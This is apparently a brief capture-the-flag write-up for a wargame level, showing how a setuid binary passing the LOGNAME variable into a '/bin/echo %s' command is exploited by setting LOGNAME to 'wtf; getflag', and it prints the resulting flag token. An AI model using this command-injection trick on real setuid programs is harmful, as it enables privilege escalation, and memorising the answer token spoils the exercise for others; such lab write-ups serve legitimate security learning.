level07 is a suid binary. ok we know this.

objdump -D -M intel level07. (-M intel very important).
gdb it.
find out that the format of the asprintf is "/bin/echo %s ". much wow.
the only argument of the format is the result of getenv("LOGNAME");
so export LOGNAME="wtf; getflag"
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
